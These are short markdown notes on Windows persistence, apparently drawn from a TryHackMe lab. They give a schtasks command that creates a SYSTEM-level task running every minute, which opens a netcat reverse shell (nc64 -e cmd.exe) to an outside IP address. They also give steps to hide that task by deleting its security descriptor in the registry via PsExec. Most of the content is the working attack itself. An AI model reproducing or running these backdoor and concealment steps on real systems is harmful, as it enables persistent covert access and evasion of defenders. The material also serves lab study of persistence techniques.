# Windows Persistence

- [TryHackMe Persistence Room](https://tryhackme.com/room/windowslocalpersistence)
- [Microsoft FAQ Scheduled Tasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)
- [Oddvar Moe Blog](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/)

## Schedule Tasks
```
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\toolsnc64 -e cmd.exe 10.10.69.167 4449" /ru SYSTEM
```

## Hide our Scheduled Task
To hide our scheduled task, we can delete its security descriptor, located in the registry.  To perform this task,
we will need to have SYSTEM level privilges.  On the victim machine:

```
PsExec64.exe -s -i regedit
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<name-of-task>
Delete the regkey for the SD (security descriptor)
```